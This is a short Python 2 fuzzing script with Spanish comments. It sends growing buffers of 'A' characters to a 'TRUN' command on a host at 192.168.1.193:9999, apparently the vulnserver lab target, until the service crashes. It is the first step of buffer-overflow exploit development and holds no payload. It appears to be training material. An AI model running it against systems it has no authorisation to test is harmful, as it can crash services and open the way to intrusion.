#!/usr/bin/python

import socket
import sys

#Fuzz parametro TRUN
pre_buff= "TRUN /../: "
buff ="A" * 100
end_buff = '\r\n'
#el loop
while True:
    buff = buff+"A"*100
    final_buff = pre_buff+buff+end_buff
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('192.168.1.193', 9999))
        print "Fuzzeando con  %d bytes" % len(buff)
        sock.send(final_buff)
        sock.recv(1024)
        sock.close()
    except:
        print "Server deja de responder a los %d bytes enviados" % len(buff)
        exit()
